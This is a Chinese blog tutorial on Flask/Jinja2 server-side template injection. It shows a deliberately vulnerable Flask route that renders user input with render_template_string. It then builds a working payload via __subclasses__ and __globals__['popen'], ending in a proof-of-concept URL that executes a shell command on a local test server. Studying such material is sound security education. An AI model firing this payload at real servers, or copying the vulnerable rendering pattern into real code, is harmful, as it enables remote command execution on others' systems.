# 原创
：  flask ssti 模板注入

# flask ssti 模板注入

###### 0x01:flask是基于python开发的一个轻量级web应用，可以用来搭建web环境。

安装flask框架命令：

```
pip install flask

```

###### 0x02:漏洞环境代码分析：

render_template_string3.py（这里是我自己给测试文件的命名）:

```
from flask import Flask,render_template_string, request

app=Flask(__name__)

&lt;span&gt;@app.route('/test')#CTL{n}def&lt;/span&gt; test():
    code = request.args.get('id')
    html = '''
        &lt;h3&gt;%s&lt;/h3&gt;
    '''%(code)
    return render_template_string(html)

if __name__ =='__main__':
    app.run()

```

没有接触过flask框架的小伙伴看到可能会有点懵，简单分析一下，运行这个py文件就会启动web服务，默认在本机的5000端口，&lt;span&gt;@app.route(‘/test’)?&lt;/span&gt;??作用是找路由，这里是http://127.0.0.1:5000/test路径。code = request.args.get(‘id’)的意思是把get传参过来的id字段赋值给变量code。

最核心的地方就是rendet_template_string()函数，这个可以渲染前端输出，这里是把code的值在前端格式化输出了。

```
html = '''
        &lt;h3&gt;%s&lt;/h3&gt;
    '''%(code)
    return render_template_string(html)

```

###### 0x03:接下来需要了解一个知识点，flask使用的是jinja2的渲染方法，渲染的时候{{}}可以解析包含的内容。如：

```
from flask import Flask,render_template_string, request

app=Flask(__name__)

&lt;span&gt;@app.route('/aaaaa')#CTL{n}def&lt;/span&gt; index():
    content = request.args.get("content")
    return render_template_string(content)


if __name__ =='__main__':
    app.run()

```

访问http://127.0.0.1:5000/aaaaa?content=1，页面会显示1

访问http://127.0.0.1:5000/aaaaa?content={{2*2}}，页面会显示4

很明显，这里的传参被执行了，说明我们可以进行注入了。

###### 0x04:实行文件读写和命令执行的基本操作：获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块

在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。

```
"".__class__ 意思是空字符串的基类，是str
"".__class__.__mro__  mro给出了method resolution order，即解析方法调用的顺序,可以得到object类
"".__class__.__bases__[0].__subclasses__()  subclasses是返回该类的所有子类的集合
举个例子，我们想要命令执行，就需要找到os函数，Ctrl+F找到了，再__init__.__globals__，这里init初始化类，然后globals全局来查找所有的方法及变量及参数。

```

到这里poc为

```
http://127.0.0.1:5000/test?id={{%27%27.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__}}

```

此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。

最终poc为：

```
http://127.0.0.1:5000/test?id={{%27%27.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__[%27popen%27](%27dir%27).read()}}

```

这里我们执行了dir命令，得到了回显。

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
